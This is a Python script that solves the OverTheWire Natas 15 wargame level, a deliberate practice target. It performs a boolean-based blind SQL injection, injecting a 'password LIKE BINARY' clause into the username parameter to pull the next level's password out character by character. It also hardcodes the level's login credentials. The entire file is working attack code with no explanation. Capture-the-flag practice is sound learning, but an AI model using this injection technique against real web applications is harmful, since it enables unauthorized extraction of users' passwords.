import requests

target = 'http://natas15.natas.labs.overthewire.org/'
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

password = ''
auth = ('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

session = requests.Session()
session.auth = auth

while len(password) < 32:
    for c in charset:
        test_pass = password + c
        payload = f'natas16" AND password LIKE BINARY "{test_pass}%" #'
        
        r = session.get(target, params={'username': payload})
        
        if 'This user exists' in r.text:
            password += c
            print(f'PASS: {password.ljust(32, "*")}')
            break
            
print(f'Final Password: {password}')